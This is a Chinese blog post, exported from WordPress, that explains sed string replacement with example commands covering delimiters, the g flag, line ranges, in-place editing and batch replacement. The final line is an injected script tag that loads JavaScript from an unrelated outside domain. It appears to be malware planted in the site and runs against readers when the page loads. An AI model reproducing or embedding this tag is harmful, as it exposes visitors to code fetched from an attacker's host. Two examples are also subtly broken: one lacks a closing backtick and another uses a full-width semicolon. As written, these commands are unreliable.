---
layout: post
title: sed 字符串替换
date: 2021-08-31 11:44:09.000000000 +08:00
type: post
parent_id: '0'
published: true
password: ''
status: publish
categories:
- Linux
tags: []
meta:
  blocksy_post_meta_options: a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}
  _edit_last: '1'
author:
  login: gavin
  email: 519077334@qq.com
  display_name: gavin
  first_name: ''
  last_name: ''
permalink: "/index.php/2021/08/31/sed-%e5%ad%97%e7%ac%a6%e4%b8%b2%e6%9b%bf%e6%8d%a2/"
---
<p>1. sed替换的基本语法为:</p>
<div class="cnblogs_code">
<pre>sed 's/原字符串/替换字符串/'</pre>
</div>
<p>单引号里面,s表示替换,三根斜线中间是替换的样式,特殊字符需要使用反斜线”\”进行转义。</p>
<p>2. 单引号” ‘ ’”是没有办法用反斜线”\”转义的,这时候只要把命令中的单引号改为双引号就行了,格式如下：</p>
<div class="cnblogs_code">
<pre># 要处理的字符包含单引号
sed "s/原字符串包含'/替换字符串包含'/"</pre>
</div>
<p>3. 命令中的三根斜线分隔符可以换成别的符号,有时候替换目录字符串的时候有较多斜线，这个时候换成其它的分割符是较为方便,只需要紧跟s定义即可。</p>
<div id="phpcode13" class="msgborder">
<div class="cnblogs_code">
<pre># 将分隔符换成问号”?”:
sed 's?原字符串?替换字符串?'</pre>
</div>
</div>
<p>4. 可以在末尾加g替换每一个匹配的关键字,否则只替换每行的第一个,例如:</p>
<div class="cnblogs_code">
<pre># 替换所有匹配关键字
sed 's/原字符串/替换字符串/g'</pre>
</div>
<p>5. 一些特殊字符的使用</p>
<p>”^”表示行首</p>
<p>”$”符号如果在引号中表示行尾，但是在引号外却表示末行(最后一行)</p>
<div class="cnblogs_code">
<pre># 注意这里的 " &amp; " 符号，如果没有 “&amp;”，就会直接将匹配到的字符串替换掉
sed 's/^/添加的头部&amp;/g' 　　　　 #在所有行首添加
sed 's/$/&amp;添加的尾部/g' 　　　　 #在所有行末添加
sed '2s/原字符串/替换字符串/g'　 #替换第2行
sed '$s/原字符串/替换字符串/g'   #替换最后一行
sed '2,5s/原字符串/替换字符串/g' #替换2到5行
sed '2,$s/原字符串/替换字符串/g' #替换2到最后一行</pre>
</div>
<p>&nbsp;</p>
<p>6.批量替换字符串</p>
<div class="cnblogs_code">
<pre>sed -i "s/查找字段/替换字段/g" `grep 查找字段 -rl 路径`
sed -i "s/oldstring/newstring/g" `grep oldstring -rl yourdir</pre>
</div>
<p>&nbsp;</p>
<p>7. sed处理过的输出是直接输出到屏幕上的,使用参数”i”直接在文件中替换。</p>
<div id="phpcode17" class="msgborder">
<div class="cnblogs_code">
<pre># 替换文件中的所有匹配项
sed -i 's/原字符串/替换字符串/g' filename</pre>
</div>
<p>8. 多个替换可以在同一条命令中执行,用分号”;”分隔，其格式为:</p>
<div class="cnblogs_code">
<pre># 同时执行两个替换规则
sed 's/^/添加的头部&amp;/g；s/$/&amp;添加的尾部/g'</pre>
</div>
</div>
<p><script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script></p>
